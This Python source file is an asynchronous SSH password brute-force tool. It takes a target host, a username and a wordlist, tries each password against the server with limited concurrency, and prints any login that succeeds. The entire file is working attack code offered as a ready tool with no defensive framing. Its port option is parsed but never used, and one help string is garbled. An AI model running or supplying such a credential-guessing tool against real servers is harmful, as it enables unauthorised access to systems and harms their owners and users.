import argparse
import asyncio
from datetime import datetime
from os import path
from sys import exit

import asyncssh
from termcolor import colored


def get_args():
    """Function to get command-line arguments"""
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-H", "--host", dest="host", help="Host to attack on e.g. 10.10.10.10."
    )
    parser.add_argument(
        "-p",
        "--port",
        dest="port",
        default=22,
        type=int,
        required=False,
        help="Port to attack on, Default:22",
    )
    parser.add_argument("-w", "--wordlist", dest="wordlist", required=True, type=str)
    parser.add_argument(
        "-u",
        "--username",
        dest="username",
        required=True,
        help="w with which bruteforce to ",
    )
    arguments = parser.parse_args()

    return arguments


async def ssh_bruteforce(hostname, username, password, port, found_flag):
    """Takes password,username,port as input and checks for connection"""
    try:
        async with asyncssh.connect(
            hostname, username=username, password=password
        ) as conn:
            found_flag.set()
            print(
                colored(
                    f"[{port}] [ssh] host:{hostname}  login:{username}  password:{password}",
                    "green",
                )
            )

    except Exception:
        print(f"[Attempt] target {hostname} - login:{username} - password:{password}")


async def main(hostname, port, username, wordlist):
    """The Main function takes hostname,port, username,wordlist Defines concurrency limit and sends taks to ssh_bruteforce function"""
    tasks = []
    passwords = []
    found_flag = asyncio.Event()
    concurrency_limit = 10
    counter = 0

    # Read wordlist using robust encoding detection/fallbacks
    def read_wordlist(path_to_file):
        encodings = ["utf-8", "utf-8-sig", "latin-1", "cp1252"]
        for enc in encodings:
            try:
                with open(path_to_file, "r", encoding=enc) as fh:
                    lines = [ln.rstrip("\r\n") for ln in fh]
                # report chosen encoding for visibility
                try:
                    print(colored(f"[*] Read wordlist using encoding: {enc}", "yellow"))
                except Exception:
                    pass
                return lines
            except UnicodeDecodeError:
                continue

        # Last resort: read binary and decode replacing errors
        with open(path_to_file, "rb") as fh:
            data = fh.read()
        text = data.decode("utf-8", errors="replace")
        try:
            print(
                colored(
                    "[*] Read wordlist using binary decode with replacement", "yellow"
                )
            )
        except Exception:
            pass
        return [ln.rstrip("\r\n") for ln in text.splitlines()]

    passwords = [p.strip() for p in read_wordlist(wordlist) if p.strip()]

    for password in passwords:
        if counter >= concurrency_limit:
            await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            tasks = []
            counter = 0

        if not found_flag.is_set():
            tasks.append(
                asyncio.create_task(
                    ssh_bruteforce(hostname, username, password, port, found_flag)
                )
            )

            await asyncio.sleep(0.5)
            counter += 1

    await asyncio.gather(*tasks)

    if not found_flag.is_set():
        print(colored("\n [-] Failed to find the correct password.", "red"))


if __name__ == "__main__":
    arguments = get_args()

    if not path.exists(arguments.wordlist):
        print(
            colored(
                "[-] Wordlist location is not right,\n[-] Provide the right path of the wordlist",
                "red",
            )
        )
        exit(1)

    print(
        "\n---------------------------------------------------------\n---------------------------------------------------------"
    )
    print(
        colored(
            "[*] Target\t: ",
            "light_red",
        ),
        end="",
    )
    print(arguments.host)
    print(
        colored(
            "[*] Username\t: ",
            "light_red",
        ),
        end="",
    )
    print(arguments.username)

    print(colored("[*] Port\t: ", "light_red"), end="")
    print("22" if not arguments.port else arguments.port)

    print(colored("[*] Wordlist\t: ", "light_red"), end="")
    print(arguments.wordlist)

    print(colored("[*] Protocol\t: ", "light_red"), end="")
    print("SSH")

    print(
        "---------------------------------------------------------\n---------------------------------------------------------",
    )

    print(
        colored(
            f"SSH-Bruteforce starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}",
            "yellow",
        )
    )
    print(
        "---------------------------------------------------------\n---------------------------------------------------------"
    )

    asyncio.run(
        main(arguments.host, arguments.port, arguments.username, arguments.wordlist)
    )
